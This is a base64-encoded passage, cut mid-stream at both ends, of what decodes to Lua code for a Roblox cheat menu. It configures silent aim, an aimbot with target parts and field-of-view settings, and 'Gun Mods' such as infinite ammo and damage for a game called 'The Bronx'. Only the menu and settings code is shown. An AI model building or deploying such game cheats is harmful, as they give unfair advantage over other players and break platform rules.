3RhdGUKICAgICAgICBlbmR9KQogICAgICAgICAgICAKICAgICAgICBHZW5lcmFsU2VjdGlvbjprZXliaW5kKHtuYW1lID0gIktleWJpbmQiLCBmbGFnID0gIlNpbGVudEFpbV9CaW5kIiwgbW9kZSA9ICJBbHdheXMiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuU2lsZW50LlRhcmdldHRpbmcgPSBzdGF0ZQogICAgICAgIGVuZH0pCgogICAgICAgIGxvY2FsIFNldHRpbmdzU2VjdGlvbiA9IFNpbGVudEFpbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlNldHRpbmdzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNDU1LCBpY29uID0gR2V0SW1hZ2UoIlNldHRpbmdzLnBuZyIpfSkKCiAgICAgICAgU2V0dGluZ3NTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9ICJWaXNpYmxlIENoZWNrIiwgZmxhZyA9ICJTaWxlbnRBaW1fV2FsbGNoZWNrIiwgdHlwZSA9ICJ0b2dnbGUiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuV2FsbENoZWNrID0gc3RhdGUKICAgICAgICBlbmR9KQoKICAgICAgICBsb2NhbCBCb2R5UGFydHMgPSB7fQoKICAgICAgICBsb2NhbCBSaWdUeXBlID0gIlIxNSIKCiAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgUmlnVHlwZSA9IExvY2FsUGxheWVyLkNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikuUmlnVHlwZS5OYW1lCiAgICAgICAgZWxzZQogICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKCiAgICAgICAgICAgIFJpZ1R5cGUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpLlJpZ1R5cGUuTmFtZQogICAgICAgIGVuZAoKICAgICAgICBCb2R5UGFydHMgPSAoUmlnVHlwZSA9PSAiUjYiKSBhbmQgewogICAgICAgICAgICAiSGVhZCIsCiAgICAgICAgICAgICJUb3JzbyIsCiAgICAgICAgICAgICJMZWZ0IEFybSIsCiAgICAgICAgICAgICJSaWdodCBBcm0iLAogICAgICAgICAgICAiTGVmdCBMZWciLAogICAgICAgICAgICAiUmlnaHQgTGVnIiwKICAgICAgICAgICAgIkh1bWFub2lkUm9vdFBhcnQiCiAgICAgICAgfSBvciAoUmlnVHlwZSA9PSAiUjE1IikgYW5kIHsKICAgICAgICAgICAgIkhlYWQiLAogICAgICAgICAgICAiVXBwZXJUb3JzbyIsCiAgICAgICAgICAgICJMb3dlclRvcnNvIiwKICAgICAgICAgICAgIkxlZnRVcHBlckFybSIsCiAgICAgICAgICAgICJMZWZ0TG93ZXJBcm0iLAogICAgICAgICAgICAiUmlnaHRVcHBlckFybSIsCiAgICAgICAgICAgICJSaWdodExvd2VyQXJtIiwKICAgICAgICAgICAgIkxlZnRVcHBlckxlZyIsCiAgICAgICAgICAgICJMZWZ0TG93ZXJMZWciLAogICAgICAgICAgICAiUmlnaHRVcHBlckxlZyIsCiAgICAgICAgICAgICJSaWdodExvd2VyTGVnIiwKICAgICAgICAgICAgIkh1bWFub2lkUm9vdFBhcnQiCiAgICAgICAgfSBvciB7fQoKICAgICAgICBTZXR0aW5nc1NlY3Rpb246ZHJvcGRvd24oe25hbWUgPSAiVGFyZ2V0IFBhcnRzIiwgZmxhZyA9ICJTaWxlbnRfVGFyZ2V0UGFydCIsIHdpZHRoID0gMTEwLCBpdGVtcyA9IEJvZHlQYXJ0cywgc2VwZXJhdG9yID0gZmFsc2UsIG11bHRpID0gdHJ1ZSwgZGVmYXVsdCA9IHsnSGVhZCd9LCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICB0YWJsZS5jbGVhcihDb25maWcuU2lsZW50LlRhcmdldFBhcnQpCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIHN0YXRlIGRvCiAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoQ29uZmlnLlNpbGVudC5UYXJnZXRQYXJ0LCBWYWx1ZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kfSkKCiAgICAgICAgU2V0dGluZ3NTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJNYXggRGlzdGFuY2UiLCBmbGFnID0gIk1heERpc3RhbmNlX1NpbGVudCIsIG1pbiA9IDAsIG1heCA9IChHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IikgYW5kIDMwMCBvciAzMDAwLCBkZWZhdWx0ID0gKEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiKSBhbmQgMzAwIG9yIDEwMDAsIHN1ZmZpeCA9ICJzdCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuTWF4RGlzdGFuY2UgPSBzdGF0ZQogICAgICAgIGVuZH0pCgogICAgICAgIFNldHRpbmdzU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiSGl0IENoYW5jZSIsIGZsYWcgPSAiU2lsZW50QWltX0hpdENoYW5jZSIsIG1pbiA9IDAsIG1heCA9IDEwMCwgZGVmYXVsdCA9IDEwMCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuU2lsZW50LkhpdENoYW5jZSA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgbG9jYWwgQnVsbGV0U2V0dGluZ3NTZWN0aW9uID0gU2lsZW50QWltQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiQnVsbGV0IFNldHRpbmdzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuMTgsIGljb24gPSBHZXRJbWFnZSgiQnVsbGV0LnBuZyIpfSkKICAgICAgICAKICAgICAgICBCdWxsZXRTZXR0aW5nc1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiQnVsbGV0IFBlbmV0cmF0aW9uIiwgZmxhZyA9ICJTaWxlbnRBaW1fV2FsbEJhbmciLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuV2FsbEJhbmcgPSBzdGF0ZQogICAgICAgIGVuZH0pCgogICAgICAgIFNpbGVudEFpbUNvbHVtbiA9IFNpbGVudEFpbVRhYjpjb2x1bW4oe30pCgogICAgICAgIGxvY2FsIEZpZWxkT2ZWaWV3U2VjdGlvbiA9IFNpbGVudEFpbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkZpZWxkIE9mIFZpZXciLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDAuMjMsIGljb24gPSBHZXRJbWFnZSgiRmllbGRPZlZpZXcyLnBuZyIpfSkKCiAgICAgICAgRmllbGRPZlZpZXdTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkVuYWJsZWQiLCBmbGFnID0gIlNpbGVudEFpbV9Vc2Vmb3YiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuVXNlRmllbGRPZlZpZXcgPSBzdGF0ZQogICAgICAgIGVuZH0pCgogICAgICAgIEZpZWxkT2ZWaWV3U2VjdGlvbjp0b2dnbGUoe3R5cGUgPSAidG9nZ2xlIiwgbmFtZSA9ICJEcmF3IENpcmNsZSIsIGZsYWcgPSAiU2lsZW50QWltX0RyYXdDaXJjbGUiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuRHJhd0ZpZWxkT2ZWaWV3ID0gc3RhdGUKICAgICAgICBlbmR9KTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJTaWxlbnRBaW1fRk9WQ29sb3IiLCBkZWZhdWx0ID0gQ29sb3IzLm5ldygxLDEsMSksIGFscGhhID0gMC4yNSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuRmllbGRPZlZpZXdDb2xvciA9IHN0YXRlCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuRmllbGRPZlZpZXdUcmFuc3BhcmVuY3kgPSAxIC0gYWxwaGEKICAgICAgICBlbmR9KQoKICAgICAgICBsb2NhbCBGaWVsZE9mVmlld1NldHRpbmdzU2VjdGlvbiA9IFNpbGVudEFpbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIkZpZWxkIE9mIFZpZXcgU2V0dGluZ3MiLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDAuMywgaWNvbiA9IEdldEltYWdlKCJTZXR0aW5ncy5wbmciKX0pCgogICAgICAgIEZpZWxkT2ZWaWV3U2V0dGluZ3NTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJSYWRpdXMiLCBmbGFnID0gIlNpbGVudEFpbV9SYWRpdXMiLCBtaW4gPSAwLCBtYXggPSAxMDAwLCBkZWZhdWx0ID0gMTAwLCBzdWZmaXggPSAiwrAiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuU2lsZW50LlJhZGl1cyA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgRmllbGRPZlZpZXdTZXR0aW5nc1NlY3Rpb246c2xpZGVyKHtuYW1lID0gIlNpZGVzIiwgZmxhZyA9ICJTaWxlbnRBaW1fU2lkZXMiLCBtaW4gPSAzLCBtYXggPSAxMDAsIGRlZmF1bHQgPSAyNSwgc3VmZml4ID0gIsKwIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLlNpbGVudC5TaWRlcyA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgbG9jYWwgU25hcGxpbmVTZWN0aW9uID0gU2lsZW50QWltQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiU25hcGxpbmUiLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDAuMjc1LCBpY29uID0gR2V0SW1hZ2UoIlNuYXBsaW5lLnBuZyIpfSkKCiAgICAgICAgU25hcGxpbmVTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkVuYWJsZWQiLCBmbGFnID0gIlNpbGVudEFpbV9TbmFwbGluZSIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLlNpbGVudC5TbmFwbGluZSA9IHN0YXRlCiAgICAgICAgZW5kfSk6Y29sb3JwaWNrZXIoe2ZsYWcgPSAiU2lsZW50QWltX1NuYXBsaW5lQ29sb3IiLCBkZWZhdWx0ID0gQ29sb3IzLm5ldygxLDEsMSksIGFscGhhID0gMSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgICAgIENvbmZpZy5TaWxlbnQuU25hcGxpbmVDb2xvciA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgU25hcGxpbmVTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJTbmFwbGluZSBUaGlja25lc3MiLCBmbGFnID0gIlNpbGVudEFpbV9TbmFwbGluZVRoaWNrbmVzcyIsIG1pbiA9IDEsIG1heCA9IDUsIGRlZmF1bHQgPSAxLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuU2lsZW50LlNuYXBsaW5lVGhpY2tuZXNzID0gc3RhdGUKICAgICAgICBlbmR9KQogICAgZW5kCgogICAgbG9jYWwgQWltbG9ja1RhYiA9IHdpbmRvdzp0YWIoe25hbWUgPSAiQWltQm90IiwgdGFicyA9IHsiR2VuZXJhbCBTZXR0aW5ncyJ9LCBpY29uID0gR2V0SW1hZ2UoIkFpbWxvY2sucG5nIil9KSBkbwogICAgICAgIGxvY2FsIEFpbWxvY2tBaW1Db2x1bW4gPSBBaW1sb2NrVGFiOmNvbHVtbih7fSkKCiAgICAgICAgbG9jYWwgR2VuZXJhbFNlY3Rpb24gPSBBaW1sb2NrQWltQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiR2VuZXJhbCIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjIzLCBpY29uID0gR2V0SW1hZ2UoIlVaSS5wbmciKX0pCgogICAgICAgIEdlbmVyYWxTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkVuYWJsZWQiLCBmbGFnID0gIkFpbWxvY2tBaW1fRW5hYmxlZCIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLkFpbWxvY2suRW5hYmxlZCA9IHN0YXRlCiAgICAgICAgZW5kfSkKICAgICAgICAgICAgCiAgICAgICAgR2VuZXJhbFNlY3Rpb246a2V5YmluZCh7bmFtZSA9ICJLZXliaW5kIiwgZmxhZyA9ICJBaW1sb2NrQWltX0JpbmQiLCBtb2RlID0gIlRvZ2dsZSIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLkFpbWluZyA9IHN0YXRlCiAgICAgICAgICAgIFRhcmdldFRhYmxlWzFdID0gbmlsCiAgICAgICAgZW5kfSkKCiAgICAgICAgbG9jYWwgU2V0dGluZ3NTZWN0aW9uID0gQWltbG9ja0FpbUNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIlNldHRpbmdzIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNTEsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQoKICAgICAgICBTZXR0aW5nc1NlY3Rpb246dG9nZ2xlKHtuYW1lID0gIlZpc2libGUgQ2hlY2siLCBmbGFnID0gIkFpbWxvY2tBaW1fV2FsbGNoZWNrIiwgdHlwZSA9ICJ0b2dnbGUiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLldhbGxDaGVjayA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgbG9jYWwgQm9keVBhcnRzID0ge30KCiAgICAgICAgbG9jYWwgUmlnVHlwZSA9ICJSMTUiCgogICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIFJpZ1R5cGUgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpLlJpZ1R5cGUuTmFtZQogICAgICAgIGVsc2UKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCgogICAgICAgICAgICBSaWdUeXBlID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKS5SaWdUeXBlLk5hbWUKICAgICAgICBlbmQKCiAgICAgICAgQm9keVBhcnRzID0gKFJpZ1R5cGUgPT0gIlI2IikgYW5kIHsKICAgICAgICAgICAgIkhlYWQiLAogICAgICAgICAgICAiVG9yc28iLAogICAgICAgICAgICAiTGVmdCBBcm0iLAogICAgICAgICAgICAiUmlnaHQgQXJtIiwKICAgICAgICAgICAgIkxlZnQgTGVnIiwKICAgICAgICAgICAgIlJpZ2h0IExlZyIsCiAgICAgICAgICAgICJIdW1hbm9pZFJvb3RQYXJ0IgogICAgICAgIH0gb3IgKFJpZ1R5cGUgPT0gIlIxNSIpIGFuZCB7CiAgICAgICAgICAgICJIZWFkIiwKICAgICAgICAgICAgIlVwcGVyVG9yc28iLAogICAgICAgICAgICAiTG93ZXJUb3JzbyIsCiAgICAgICAgICAgICJMZWZ0VXBwZXJBcm0iLAogICAgICAgICAgICAiTGVmdExvd2VyQXJtIiwKICAgICAgICAgICAgIlJpZ2h0VXBwZXJBcm0iLAogICAgICAgICAgICAiUmlnaHRMb3dlckFybSIsCiAgICAgICAgICAgICJMZWZ0VXBwZXJMZWciLAogICAgICAgICAgICAiTGVmdExvd2VyTGVnIiwKICAgICAgICAgICAgIlJpZ2h0VXBwZXJMZWciLAogICAgICAgICAgICAiUmlnaHRMb3dlckxlZyIsCiAgICAgICAgICAgICJIdW1hbm9pZFJvb3RQYXJ0IgogICAgICAgIH0gb3Ige30KCiAgICAgICAgU2V0dGluZ3NTZWN0aW9uOmRyb3Bkb3duKHtuYW1lID0gIkFpbWxvY2sgVHlwZSIsIGZsYWcgPSAiQWltbG9ja19BaW1UeXBlIiwgd2lkdGggPSAxMTAsIGl0ZW1zID0geydDYW1lcmEnLCAnTW91c2UnfSwgc2VwZXJhdG9yID0gZmFsc2UsIG11bHRpID0gZmFsc2UsIGRlZmF1bHQgPSAnTW91c2UnLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuQWltbG9jay5UeXBlID0gc3RhdGUKICAgICAgICBlbmR9KQoKICAgICAgICBTZXR0aW5nc1NlY3Rpb246ZHJvcGRvd24oe25hbWUgPSAiVGFyZ2V0IFBhcnRzIiwgZmxhZyA9ICJBaW1sb2NrX1RhcmdldFBhcnQiLCB3aWR0aCA9IDExMCwgaXRlbXMgPSBCb2R5UGFydHMsIHNlcGVyYXRvciA9IGZhbHNlLCBtdWx0aSA9IGZhbHNlLCBkZWZhdWx0ID0gJ0hlYWQnLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuQWltbG9jay5UYXJnZXRQYXJ0ID0gc3RhdGUKICAgICAgICBlbmR9KQoKICAgICAgICBTZXR0aW5nc1NlY3Rpb246c2xpZGVyKHtuYW1lID0gIk1heCBEaXN0YW5jZSIsIGZsYWcgPSAiTWF4RGlzdGFuY2VfQWltbG9jayIsIG1pbiA9IDAsIG1heCA9IDMwMDAsIGRlZmF1bHQgPSAoKEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiKSBhbmQgMzAwIG9yIDEwMDApLCBzdWZmaXggPSAic3QiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBDb25maWcuQWltbG9jay5NYXhEaXN0YW5jZSA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgU2V0dGluZ3NTZWN0aW9uOnNsaWRlcih7bmFtZSA9ICJTbW9vdGhuZXNzIiwgZmxhZyA9ICJNYXhEaXN0YW5jZV9TbW9vdGhuZXNzIiwgbWluID0gMCwgbWF4ID0gMTAwLCBkZWZhdWx0ID0gMTAsIHN1ZmZpeCA9ICIlIiwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLkFpbWxvY2suU21vb3RobmVzcyA9IHN0YXRlLzEwCiAgICAgICAgZW5kfSkKCiAgICAgICAgQWltbG9ja0FpbUNvbHVtbiA9IEFpbWxvY2tUYWI6Y29sdW1uKHt9KQoKICAgICAgICBsb2NhbCBGaWVsZE9mVmlld1NlY3Rpb24gPSBBaW1sb2NrQWltQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiRmllbGQgT2YgVmlldyIsIHNpZGUgPSAicmlnaHQiLCBzaXplID0gMC4yMywgaWNvbiA9IEdldEltYWdlKCJGaWVsZE9mVmlldzIucG5nIil9KQoKICAgICAgICBGaWVsZE9mVmlld1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiRW5hYmxlZCIsIGZsYWcgPSAiQWltbG9ja0FpbV9Vc2Vmb3YiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlVzZUZpZWxkT2ZWaWV3ID0gc3RhdGUKICAgICAgICBlbmR9KQoKICAgICAgICBGaWVsZE9mVmlld1NlY3Rpb246dG9nZ2xlKHt0eXBlID0gInRvZ2dsZSIsIG5hbWUgPSAiRHJhdyBDaXJjbGUiLCBmbGFnID0gIkFpbWxvY2tBaW1fRHJhd0NpcmNsZSIsIGRlZmF1bHQgPSBmYWxzZSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgQ29uZmlnLkFpbWxvY2suRHJhd0ZpZWxkT2ZWaWV3ID0gc3RhdGUKICAgICAgICBlbmR9KTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJBaW1sb2NrQWltX0ZPVkNvbG9yIiwgZGVmYXVsdCA9IENvbG9yMy5uZXcoMSwxLDEpLCBhbHBoYSA9IDAuMjUsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUsIGFscGhhKQogICAgICAgICAgICBDb25maWcuQWltbG9jay5GaWVsZE9mVmlld0NvbG9yID0gc3RhdGUKICAgICAgICAgICAgQ29uZmlnLkFpbWxvY2suRmllbGRPZlZpZXdUcmFuc3BhcmVuY3kgPSAxIC0gYWxwaGEKICAgICAgICBlbmR9KQoKICAgICAgICBsb2NhbCBGaWVsZE9mVmlld1NldHRpbmdzU2VjdGlvbiA9IEFpbWxvY2tBaW1Db2x1bW46c2VjdGlvbih7bmFtZSA9ICJGaWVsZCBPZiBWaWV3IFNldHRpbmdzIiwgc2lkZSA9ICJyaWdodCIsIHNpemUgPSAwLjMsIGljb24gPSBHZXRJbWFnZSgiU2V0dGluZ3MucG5nIil9KQoKICAgICAgICBGaWVsZE9mVmlld1NldHRpbmdzU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiUmFkaXVzIiwgZmxhZyA9ICJBaW1sb2NrQWltX1JhZGl1cyIsIG1pbiA9IDAsIG1heCA9IDEwMDAsIGRlZmF1bHQgPSAxMDAsIHN1ZmZpeCA9ICLCsCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlJhZGl1cyA9IHN0YXRlCiAgICAgICAgZW5kfSkKCiAgICAgICAgRmllbGRPZlZpZXdTZXR0aW5nc1NlY3Rpb246c2xpZGVyKHtuYW1lID0gIlNpZGVzIiwgZmxhZyA9ICJBaW1sb2NrQWltX1NpZGVzIiwgbWluID0gMywgbWF4ID0gMTAwLCBkZWZhdWx0ID0gMjUsIHN1ZmZpeCA9ICLCsCIsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlNpZGVzID0gc3RhdGUKICAgICAgICBlbmR9KQoKICAgICAgICBsb2NhbCBTbmFwbGluZVNlY3Rpb24gPSBBaW1sb2NrQWltQ29sdW1uOnNlY3Rpb24oe25hbWUgPSAiU25hcGxpbmUiLCBzaWRlID0gInJpZ2h0Iiwgc2l6ZSA9IDAuMjc1LCBpY29uID0gR2V0SW1hZ2UoIlNuYXBsaW5lLnBuZyIpfSkKCiAgICAgICAgU25hcGxpbmVTZWN0aW9uOnRvZ2dsZSh7dHlwZSA9ICJ0b2dnbGUiLCBuYW1lID0gIkVuYWJsZWQiLCBmbGFnID0gIkFpbWxvY2tBaW1fU25hcGxpbmUiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lID0gc3RhdGUKICAgICAgICBlbmR9KTpjb2xvcnBpY2tlcih7ZmxhZyA9ICJBaW1sb2NrQWltX1NuYXBsaW5lQ29sb3IiLCBkZWZhdWx0ID0gQ29sb3IzLm5ldygxLDEsMSksIGFscGhhID0gMSwgY2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSwgYWxwaGEpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lQ29sb3IgPSBzdGF0ZQogICAgICAgIGVuZH0pCgogICAgICAgIFNuYXBsaW5lU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiU25hcGxpbmUgVGhpY2tuZXNzIiwgZmxhZyA9ICJBaW1sb2NrQWltX1NuYXBsaW5lVGhpY2tuZXNzIiwgbWluID0gMSwgbWF4ID0gNSwgZGVmYXVsdCA9IDEsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lVGhpY2tuZXNzID0gc3RhdGUKICAgICAgICBlbmR9KQogICAgZW5kCgogICAgaWYgR2FtZV9OYW1lID09ICJUaGUgQnJvbngiIGFuZCBub3QgU29sYXJhIHRoZW4KICAgICAgICBsb2NhbCBXZWFwb25Nb2RUYWIsIE1pc2NNb2RUYWIgPSB3aW5kb3c6dGFiKHtuYW1lID0gIkd1biBNb2RzIiwgdGFicyA9IHsiV2VhcG9uIE1vZGlmaWNhdGlvbnMifSwgaWNvbiA9IEdldEltYWdlKCJXcmVuY2gucG5nIil9KSBkbwogICAgICAgICAgICBsb2NhbCBXZWFwb25Nb2RUYWJDb2x1bW4gPSBXZWFwb25Nb2RUYWI6Y29sdW1uKHt9KSBkbwogICAgICAgICAgICAgICAgbG9jYWwgR2VuZXJhbFNlY3Rpb24gPSBXZWFwb25Nb2RUYWJDb2x1bW46c2VjdGlvbih7bmFtZSA9ICJXZWFwb24gTW9kaWZpY2F0aW9ucyIsIHNpZGUgPSAibGVmdCIsIHNpemUgPSAwLjUsIGljb24gPSBHZXRJbWFnZSgiUGlzdG9sLnBuZyIpfSkKCiAgICAgICAgICAgICAgICBsb2NhbCBNb2RpZmljYXRpb25zID0gewogICAgICAgICAgICAgICAgICAgICJJbmZpbml0ZSBBbW1vIjsKICAgICAgICAgICAgICAgICAgICAiSW5maW5pdGUgQ2xpcHMiOwogICAgICAgICAgICAgICAgICAgICJJbmZpbml0ZSBEYW1hZ2UiOwogICAgICAgICAgICAgICAgICAgICJGdWxseSBBdXRvbWF0aWMiOwogICAgICAgICAgICAgICAgICAgICJEaXNhYmxlIEphbW1pbmciOwogICAgICAgICAgICAgICAgICAgICJNb2RpZnkgUmVjb2lsIFZhbHVlIjsKICAgICAgICAgICAgICAgICAgICAiTW9kaWZ5IFNwcmVhZCBWYWx1ZSI7CiAgICAgICAgICAgICAgICAgICAgIk1vZGlmeSBSZWxvYWQgU3BlZWQiOwogICAgICAgICAgICAgICAgICAgICJNb2RpZnkgRXF1aXAgU3BlZWQiOwogICAgICAgICAgICAgICAgICAgICJNb2RpZnkgRmlyZSBSYXRlIjsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmb3IgXywgSW5kZXggaW4gTW9kaWZpY2F0aW9ucyBkbwogICAgICAgICAgICAgICAgICAgIEdlbmVyYWxTZWN0aW9uOnRvZ2dsZSh7bmFtZSA9IEluZGV4LCBmbGFnID0gSW5kZXguLiJfVEIzIiwgdHlwZSA9ICJ0b2dnbGUiLCBkZWZhdWx0ID0gZmFsc2UsIGNhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEluZGV4ID09ICJGdWxseSBBdXRvbWF0aWMiIHRoZW4gSW5kZXggPSAiQXV0b21hdGljIiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlRoZUJyb254Lk1vZGlmaWNhdGlvbnNbSW5kZXg6Z3N1YigiICIsICIiKV0gPSBzdGF0ZQogICAgICAgICAgICAgICAgICAgIGVuZH0pCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBHZW5lcmFsU2VjdGlvbiA9IFdlYXBvbk1vZFRhYkNvbHVtbjpzZWN0aW9uKHtuYW1lID0gIldlYXBvbiBNb2RpZmljYXRpb25zIiwgc2lkZSA9ICJsZWZ0Iiwgc2l6ZSA9IDAuNSwgaWNvbiA9IEdldEltYWdlKCJTZXR0aW5ncy5wbmciKX0pCgogICAgICAgICAgICAgICAgR2VuZXJhbFNlY3Rpb246c2xpZGVyKHtuYW1lID0gIlJlY29pbCBQZXJjZW50YWdlIiwgZmxhZyA9ICJSZWNvaWxWYWx1ZV9UQjMiLCBkZWZhdWx0ID0gNTAsIG1pbiA9IDAsIG1heCA9IDEwMCwgc3VmZml4ID0gIiUiLCBjYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICAgICAgICAgIENvbmZpZy5UaGVCcm9ueC5Nb2RpZmljYXRpb25zLlJlY29pbFBlcmNlbnRhZ2UgPSBzdGF0ZQogICAgICAgICAgICAgICAgZW5kfSkKCiAgICAgICAgICAgICAgICBHZW5lcmFsU2VjdGlvbjpzbGlkZXIoe25hbWUgPSAiU3ByZWFkIFBlcmNlbnRhZ2UiLCBmbGFnID0gIlNwcmVhZFZhbHVlX1RCMyIsIGRlZmF1bHQgPSA1MCwgbW